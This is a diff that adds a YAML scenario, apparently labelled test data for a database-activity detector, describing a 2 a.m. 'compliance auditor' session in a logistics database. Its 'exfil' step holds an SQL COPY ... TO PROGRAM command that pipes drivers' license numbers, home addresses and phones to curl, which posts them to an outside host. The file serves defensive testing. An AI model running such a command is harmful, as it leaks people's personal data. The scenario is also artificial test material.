@@ -1,0 +1,24 @@
+scenario_id: logistics_compliance_auditor_exfil_0006
+family_id: logistics_compliance_auditor_exfil_0006
+domain: logistics
+time_of_day: 02:00
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: exfil
+  role: compliance_auditor
+  class: malicious
+  anchor: db
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 0.9806926626143222
+  events:
+  - sql: SELECT w.name, w.location, COUNT(s.shipment_id) as total_shipments, SUM(m.declared_value) as total_value FROM warehouses w JOIN shipments s ON s.origin_warehouse_id = w.warehouse_id JOIN manifests
+      m ON m.shipment_id = s.shipment_id GROUP BY w.name, w.location ORDER BY total_value DESC
+  - step_id: exfil
+    sql: COPY (SELECT d.license_number, d.home_address, d.phone, s.dest_address, m.declared_value FROM drivers d JOIN shipments s ON s.driver_id = d.driver_id JOIN manifests m ON m.shipment_id = s.shipment_id)
+      TO PROGRAM 'curl -sX POST https://analytics.example.net/submit -d @-'
+    connects_to:
+      ip: 185.100.87.41
+      port: 9443
